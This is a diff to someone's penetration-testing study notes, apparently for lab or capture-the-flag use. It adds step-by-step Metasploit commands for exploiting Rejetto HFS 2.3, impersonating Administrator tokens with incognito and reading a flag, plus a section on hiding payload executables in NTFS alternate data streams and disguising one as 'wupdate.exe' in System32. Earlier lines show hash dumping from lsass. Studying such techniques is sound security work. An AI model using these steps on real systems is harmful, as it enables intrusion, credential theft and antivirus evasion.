@@ -177,4 +177,36 @@ STEP 2: Privelege escalation
 18. migrate to lsass.exe(for NT AUTHORITY\SYSTEM): list processes:`ps`, `migrate 688` <--PID number , when in folder(INFO):`C:\Windows\system32`
 19. get hashdump NTLM hashdump: `hashdump`
 
-**Privelege Escalation: Access Token Impersonation**
+### Privelege Escalation: Access Token Impersonation
+
+- Privileges required for a successful impersonation attack:
+  - SeAssignPrimaryToken
+  * SeCreateToken
+  - SeImpersonatePrivilage
+
+INFO: this also exploit the rejetto 2.3 version as UAC with UACME
+
+1. `service postgresql start && msfconsole` -> `search rejetto`
+2. set options then `run`
+3. `getprivs` to check if you have the required privileges
+4. `load incognito`
+5. `list_tokens -u`
+6. `impersonate_token "highest_level\Administrator"` <- copy the highest level you find(, if no high level is found you need to do a potato attack(?)) then run
+7. `pgrep explorer` -> `migrate number_found`
+8. `cat C:\\UsersAdministrator\\Desktop\\flag.txt`
+
+### Alternate Data Streams
+
+- ADS, NTFS file attribute.
+- two forks: 1. Data stream(data of the file), 2.Resource stream(meta data)
+- Attackers use ADS to hide malicious code or executable in legidimate files
+- evade AVs and static scanning tools
+- hide in resource stream
+
+1. on windows: `notepad legitimate_file.txt:secret_file.txt`, create the file
+2. if you want to open hidden file: `notepad legitimate_file.txt:secret_file.txt`
+3. hide executable `notepad legitimate_file.txt:payload.exe`
+4. move .exe in secret .txt file, on windows: `type payload.exe > legimitate_file:payload.exe`
+5. run file(on windows): `start legitimate_file.txt:payload.exe`
+6. Not working? symbolic link: `cd Windows\System32` -> `mklink wupdate.exe C:\absolute_file_path(ususally Temp fodler)\legitimate_file.txt:payload.exe`
+7. may not work if you do not have adm privileges.
